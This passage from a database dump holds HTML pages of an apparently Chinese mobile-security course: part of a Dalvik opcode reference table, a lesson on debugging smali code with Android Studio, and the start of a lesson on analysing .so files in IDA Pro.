vz and puts the result into vx.<o:p></o:p></p></td><td><p>9303 0001 - div-int v3, v0, v1<br>Divides v0 with v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>94<o:p></o:p></p></td><td><p>rem-int vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy % vz and puts the result into vx.<o:p></o:p></p></td><td><p>9400 0203 - rem-int v0, v2, v3<br>Calculates v3 % v2 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>95<o:p></o:p></p></td><td><p>and-int vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy AND vz and puts the result into vx.<o:p></o:p></p></td><td><p>9503 0001 - and-int v3, v0, v1<br>Calculates v0 AND v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>96<o:p></o:p></p></td><td><p>or-int vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy OR vz and puts the result into vx.<o:p></o:p></p></td><td><p>9603 0001 - or-int v3, v0, v1<br>Calculates v0 OR v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>97<o:p></o:p></p></td><td><p>xor-int vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy XOR vz and puts the result into vx.<o:p></o:p></p></td><td><p>9703 0001 - xor-int v3, v0, v1<br>Calculates v0 XOR v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>98<o:p></o:p></p></td><td><p>shl-int vx, vy, vz<o:p></o:p></p></td><td><p>Shift vy left by the positions specified by vz and store the result into vx.<o:p></o:p></p></td><td><p>9802 0001 - shl-int v2, v0, v1<br>Shift v0 left by the positions specified by v1 and store the result in v2.<o:p></o:p></p></td></tr><tr><td><p>99<o:p></o:p></p></td><td><p>shr-int vx, vy, vz<o:p></o:p></p></td><td><p>Shift vy right by the positions specified by vz and store the result into vx.<o:p></o:p></p></td><td><p>9902 0001 - shr-int v2, v0, v1<br>Shift v0 right by the positions specified by v1 and store the result in v2.<o:p></o:p></p></td></tr><tr><td><p>9A<o:p></o:p></p></td><td><p>ushr-int vx, vy, vz<o:p></o:p></p></td><td><p>Unsigned shift right (&gt;&gt;&gt;) vy by the positions specified by vz and store the result into vx.<o:p></o:p></p></td><td><p>9A02 0001 - ushr-int v2, v0, v1<br>Unsigned shift v0 right by the positions specified by v1 and store the result in v2.<o:p></o:p></p></td></tr><tr><td><p>9B<o:p></o:p></p></td><td><p>add-long vx, vy, vz<o:p></o:p></p></td><td><p>Adds vy to vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>9B00 0305 - add-long v0, v3, v5<br>The long value in v3,v4 is added to the value in v5,v6 and the result is stored in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>9C<o:p></o:p></p></td><td><p>sub-long vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy-vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>9C00 0305 - sub-long v0, v3, v5<br>Subtracts the long value in v5,v6 from the long value in v3,v4 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>9D<o:p></o:p></p></td><td><p>mul-long vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy*vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>9D00 0305 - mul-long v0, v3, v5<br>Multiplies the long value in v5,v6 with the long value in v3,v4 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>9E<o:p></o:p></p></td><td><p>div-long vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy/vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>9E06 0002 - div-long v6, v0, v2<br>Divides the long value in v0,v1 with the long value in v2,v3 and pust the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>9F<o:p></o:p></p></td><td><p>rem-long vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy % vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>9F06 0002 - rem-long v6, v0, v2<br>Calculates v0,v1 %&nbsp; v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>A0<o:p></o:p></p></td><td><p>and-long vx, vy, vz<o:p></o:p></p></td><td><p>Calculates the vy AND vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A006 0002 - and-long v6, v0, v2<br>Calculates v0,v1 AND v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>A1<o:p></o:p></p></td><td><p>or-long vx, vy, vz<o:p></o:p></p></td><td><p>Calculates the vy OR vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A106 0002 - or-long v6, v0, v2<br>Calculates v0,v1 OR v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>A2<o:p></o:p></p></td><td><p>xor-long vx, vy, vz<o:p></o:p></p></td><td><p>Calculates the vy XOR vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A206 0002 - xor-long v6, v0, v2<br>Calculates v0,v1 XOR v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>A3<o:p></o:p></p></td><td><p>shl-long vx, vy, vz<o:p></o:p></p></td><td><p>Shifts left vy by vz positions and stores the result in vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A302 0004 - shl-long v2, v0, v4<br>Shift v0,v1 by postions specified by v4 and puts the result into v2,v3.&nbsp;<o:p></o:p></p></td></tr><tr><td><p>A4<o:p></o:p></p></td><td><p>shr-long vx,vy,vz<o:p></o:p></p></td><td><p>Shifts right vy by vz positions and stores the result in vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A402 0004 - shr-long v2, v0, v4<br>Shift v0,v1 by postions specified by v4 and puts the result into v2,v3.&nbsp;<o:p></o:p></p></td></tr><tr><td><p>A5<o:p></o:p></p></td><td><p>ushr-long vx, vy, vz<o:p></o:p></p></td><td><p>Unsigned shifts right vy by vz positions and stores the result in vx<sup>1</sup>.<o:p></o:p></p></td><td><p>A502 0004 - ushr-long v2, v0, v4<br>Unsigned shift v0,v1 by postions specified by v4 and puts the result into v2,v3.<o:p></o:p></p></td></tr><tr><td><p>A6<o:p></o:p></p></td><td><p>add-float vx,vy,vz<o:p></o:p></p></td><td><p>Adds vy to vz and puts the result into vx.<o:p></o:p></p></td><td><p>A600 0203 - add-float v0, v2, v3<br>Adds the floating point numbers in v2 and v3 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>A7<o:p></o:p></p></td><td><p>sub-float vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy-vz and puts the result into vx.<o:p></o:p></p></td><td><p>A700 0203 - sub-float v0, v2, v3<br>Calculates v2-v3 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>A8<o:p></o:p></p></td><td><p>mul-float vx, vy, vz<o:p></o:p></p></td><td><p>Multiplies vy with vz and puts the result into vx.<o:p></o:p></p></td><td><p>A803 0001 - mul-float v3, v0, v1<br>Multiplies v0 with v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>A9<o:p></o:p></p></td><td><p>div-float vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy/vz and puts the result into vx.<o:p></o:p></p></td><td><p>A903 0001 - div-float v3, v0, v1<br>Divides v0 with v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>AA<o:p></o:p></p></td><td><p>rem-float vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy % vz and puts the result into vx.<o:p></o:p></p></td><td><p>AA03 0001 - rem-float v3, v0, v1<br>Calculates v0 %&nbsp; v1 and puts the result into v3.<o:p></o:p></p></td></tr><tr><td><p>AB<o:p></o:p></p></td><td><p>add-double vx,vy,vz<o:p></o:p></p></td><td><p>Adds vy to vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>AB00 0305 - add-double v0, v3, v5<br>Adds the double value in v5,v6 registers to the double value in v3,v4&nbsp; &nbsp;registers and places the result&nbsp; in v0,v1 registers.<o:p></o:p></p></td></tr><tr><td><p>AC<o:p></o:p></p></td><td><p>sub-double vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy-vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>AC00 0305 - sub-double v0, v3, v5<br>Subtracts the value in v5,v6 from the value in v3,v4 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>AD<o:p></o:p></p></td><td><p>mul-double vx, vy, vz<o:p></o:p></p></td><td><p>Multiplies vy with vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>AD06 0002 - mul-double v6, v0, v2<br>Multiplies the double value in v0,v1 with the double value in v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>AE<o:p></o:p></p></td><td><p>div-double vx, vy, vz<o:p></o:p></p></td><td><p>Calculates vy/vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>AE06 0002 - div-double v6, v0, v2<br>Divides the double value in v0,v1 with the double value in v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>AF<o:p></o:p></p></td><td><p>rem-double vx,vy,vz<o:p></o:p></p></td><td><p>Calculates vy % vz and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>AF06 0002 - rem-double v6, v0, v2<br>Calculates v0,v1 % v2,v3 and puts the result into v6,v7.<o:p></o:p></p></td></tr><tr><td><p>B0<o:p></o:p></p></td><td><p>add-int/2addr vx,vy<o:p></o:p></p></td><td><p>Adds vy to vx.<o:p></o:p></p></td><td><p>B010 - add-int/2addr v0,v1<br>Adds v1 to v0.<o:p></o:p></p></td></tr><tr><td><p>B1<o:p></o:p></p></td><td><p>sub-int/2addr vx,vy<o:p></o:p></p></td><td><p>Calculates vx-vy and puts the result into vx.<o:p></o:p></p></td><td><p>B140 - sub-int/2addr v0, v4<br>Subtracts v4 from v0 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B2<o:p></o:p></p></td><td><p>mul-int/2addr vx,vy<o:p></o:p></p></td><td><p>Multiplies vx with vy.<o:p></o:p></p></td><td><p>B210 - mul-int/2addr v0, v1<br>Multiples v0 with v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B3<o:p></o:p></p></td><td><p>div-int/2addr vx,vy<o:p></o:p></p></td><td><p>Divides vx with vy and puts the result into vx.<o:p></o:p></p></td><td><p>B310 - div-int/2addr v0, v1<br>Divides v0 with v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B4<o:p></o:p></p></td><td><p>rem-int/2addr vx,vy<o:p></o:p></p></td><td><p>Calculates vx % vy and puts the result into vx<o:p></o:p></p></td><td><p>B410 - rem-int/2addr v0, v1<br>Calculates v0 % v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B5<o:p></o:p></p></td><td><p>and-int/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx AND vy and puts the result into vx.<o:p></o:p></p></td><td><p>B510 - and-int/2addr v0, v1<br>Calculates v0 AND v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B6<o:p></o:p></p></td><td><p>or-int/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx OR vy and puts the result into vx.<o:p></o:p></p></td><td><p>B610 - or-int/2addr v0, v1<br>Calculates v0 OR v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B7<o:p></o:p></p></td><td><p>xor-int/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx XOR vy and puts the result into vx.<o:p></o:p></p></td><td><p>B710&nbsp; - xor-int/2addr v0, v1<br>Calculates v0 XOR v1 and puts the result into v0.<o:p></o:p></p></td></tr><tr><td><p>B8<o:p></o:p></p></td><td><p>shl-int/2addr vx, vy<o:p></o:p></p></td><td><p>Shifts vx left by vy positions.<o:p></o:p></p></td><td><p>B810 - shl-int/2addr v0, v1<br>Shift v0 left by v1 positions.<o:p></o:p></p></td></tr><tr><td><p>B9<o:p></o:p></p></td><td><p>shr-int/2addr vx, vy<o:p></o:p></p></td><td><p>Shifts vx right by vy positions.<o:p></o:p></p></td><td><p>B910 - shr-int/2addr v0, v1<br>Shift v0 right by v1 positions.<o:p></o:p></p></td></tr><tr><td><p>BA<o:p></o:p></p></td><td><p>ushr-int/2addr vx, vy<o:p></o:p></p></td><td><p>Unsigned shift right (&gt;&gt;&gt;) vx by the positions specified by vy.<o:p></o:p></p></td><td><p>BA10 - ushr-int/2addr v0, v1<br>Unsigned shift v0 by the positions specified by v1.<o:p></o:p></p></td></tr><tr><td><p>BB<o:p></o:p></p></td><td><p>add-long/2addr vx,vy<o:p></o:p></p></td><td><p>Adds vy to vx<sup>1</sup>.<o:p></o:p></p></td><td><p>BB20 - add-long/2addr v0, v2<br>Adds the long value in v2,v3 registers to the long value in v0,v1 registers.<o:p></o:p></p></td></tr><tr><td><p>BC<o:p></o:p></p></td><td><p>sub-long/2addr vx,vy<o:p></o:p></p></td><td><p>Calculates vx-vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>BC70 - sub-long/2addr v0, v7<br>Subtracts the long value in v7,v8 from the long value in v0,v1 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>BD<o:p></o:p></p></td><td><p>mul-long/2addr vx,vy<o:p></o:p></p></td><td><p>Calculates vx*vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>BD70 - mul-long/2addr v0, v7<br>Multiplies the long value in v7,v8 with the long value in v0,v1 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>BE<o:p></o:p></p></td><td><p>div-long/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx/vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>BE20 - div-long/2addr v0, v2<br>Divides the long value in v0,v1 with the long value in v2,v3 and puts the result into v0,v1<o:p></o:p></p></td></tr><tr><td><p>BF<o:p></o:p></p></td><td><p>rem-long/2addr vx,vy<o:p></o:p></p></td><td><p>Calculates vx % vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>BF20 - rem-long/2addr v0, v2<br>Calculates v0,v1 % v2,v3 and puts the result into v0,v1<o:p></o:p></p></td></tr><tr><td><p>C0<o:p></o:p></p></td><td><p>and-long/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx AND vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>C020 - and-long/2addr v0, v2<br>Calculates v0,v1 OR v2,v3 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>C1<o:p></o:p></p></td><td><p>or-long/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx OR vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td><p>C120&nbsp; - or-long/2addr v0, v2<br>Calculates v0,v1 OR v2,v3 and puts the result into v0,v1.<o:p></o:p></p></td></tr><tr><td><p>C2<o:p></o:p></p></td><td><p>xor-long/2addr vx, vy<o:p></o:p></p></td><td><p>Calculates vx XOR vy and puts the result into vx<sup>1</sup>.<o:p></o:p></p></td><td>',0,''),(97,'移动安全基础课程训练九','移动安全基础课程训练逆向篇','<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Android逆向四</p><p>一.Smali代码的动态调试</p><p>安装ideasmali插件,File-&gt;Settings-&gt;Plugins，安装之前下载的ideasmali插件。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1039\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:412.5pt;height:276.75pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"http://img0.tuicool.com/ZNRr6fN.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.gif\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>反编译apk</p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1038\" type=\"#_x0000_t75\" alt=\"IMG_257\" style=\"width:277.5pt;height:19.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"http://img0.tuicool.com/a2eeYb.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.gif\" alt=\"IMG_257\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>以调试状态启动app，并转发8700端口 &nbsp;[app_pid]</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1037\" type=\"#_x0000_t75\" alt=\"IMG_258\" style=\"width:412.5pt;height:30pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"http://img1.tuicool.com/JB7RBrU.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.gif\" alt=\"IMG_258\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1036\" type=\"#_x0000_t75\" alt=\"IMG_259\" style=\"width:388.5pt;height:243pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"http://img1.tuicool.com/3InqAjA.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.gif\" alt=\"IMG_259\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1036\" type=\"#_x0000_t75\" alt=\"IMG_259\" style=\"width:388.5pt;height:243pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"http://img1.tuicool.com/3InqAjA.png!web\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.5.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1035\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:183.75pt;height:19.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:href=\"http://img1.tuicool.com/YfMFR37.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.gif\" alt=\"IMG_260\"></v:imagedata></v:shape></p><p>记住这时候需要将DDMS关掉，不然会出现错误\r\n</p><p><v:shape id=\"图片_x0020_6\" o:spid=\"_x0000_i1034\" type=\"#_x0000_t75\" alt=\"IMG_261\" style=\"width:233.25pt;height:42.75pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:href=\"http://img1.tuicool.com/MfmyArQ.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.gif\" alt=\"IMG_261\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>使用AS导入之前反编译的目录，这里选择debugsmali文件夹就可以了。</p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1033\" type=\"#_x0000_t75\" alt=\"IMG_262\" style=\"width:412.5pt;height:313.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:href=\"http://img0.tuicool.com/3E77v2a.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image014.gif\" alt=\"IMG_262\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.7.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>然后选择Create project from existing sources，之后一直选择next。</p><p><v:shape id=\"图片_x0020_8\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" alt=\"IMG_263\" style=\"width:412.5pt;height:145.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image015.png\" o:href=\"http://img2.tuicool.com/VbaeQ3M.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image016.gif\" alt=\"IMG_263\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.8.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>对之前反编译的debugsmali/src文件夹右键--&gt;Make Directory As ---&gt;Source Root</p><p><v:shape id=\"图片_x0020_9\" o:spid=\"_x0000_i1031\" type=\"#_x0000_t75\" alt=\"IMG_264\" style=\"width:375pt;height:399pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image017.png\" o:href=\"http://img0.tuicool.com/U3Ivaqy.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image018.gif\" alt=\"IMG_264\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.9.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>配置远程调试的选项，选择Run--&gt;Edit Configurations：</p><p><v:shape id=\"图片_x0020_10\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" alt=\"IMG_265\" style=\"width:345.75pt;height:476.25pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image019.png\" o:href=\"http://img2.tuicool.com/baEJVbe.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image020.gif\" alt=\"IMG_265\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.10.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>增加一个Remote调试的调试选项，端口选择:8700</p><p><v:shape id=\"图片_x0020_11\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" alt=\"IMG_266\" style=\"width:412.5pt;height:263.25pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image021.png\" o:href=\"http://img2.tuicool.com/zyqMRr.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image022.gif\" alt=\"IMG_266\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.11.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>之后选择File--&gt;Project Structure 配置JDK</p><p><v:shape id=\"图片_x0020_12\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" alt=\"IMG_267\" style=\"width:219.75pt;height:294pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image023.png\" o:href=\"http://img1.tuicool.com/MNnqYve.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image024.gif\" alt=\"IMG_267\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.12.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" alt=\"IMG_267\" style=\"width:219.75pt;height:294pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image023.png\" o:href=\"http://img1.tuicool.com/MNnqYve.png!web\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.13.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_13\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_268\" style=\"width:412.5pt;height:270.75pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image025.png\" o:href=\"http://img2.tuicool.com/FZBjeyY.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image026.gif\" alt=\"IMG_268\"></v:imagedata></v:shape></p><p>下好断点之后Run--&gt;Debug\'smali\'，这里的smali是我们之前配置好的调试选项。</p><p><v:shape id=\"图片_x0020_14\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" alt=\"IMG_269\" style=\"width:346.5pt;height:378.75pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image027.png\" o:href=\"http://img0.tuicool.com/6byaiqF.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image028.gif\" alt=\"IMG_269\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.14.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>运行起来之后就可以单步执行，查看寄存器的值，慢慢调试了。</p><p><v:shape id=\"图片_x0020_15\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" alt=\"IMG_270\" style=\"width:412.5pt;height:219pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image029.png\" o:href=\"http://img1.tuicool.com/rInuain.png!web\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image030.gif\" alt=\"IMG_270\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%939.15.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:27:58',1,NULL,'<p>查看报告</p>',0,''),(98,'移动安全基础课程训练十','移动安全基础课程训练逆向篇','<p>&nbsp; &nbsp; &nbsp; &nbsp;Android逆向五</p><p>一.So文件的静态分析</p><p>1.将apk中lib文件下的so文件拖入IDA\r\npro,这里我们用到IDA pro 6.8版本。</p><p>2.IDA\r\npro中File-&gt;Open-&gt;选择so文件的路径</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1039\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:453.75pt;height:345pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" 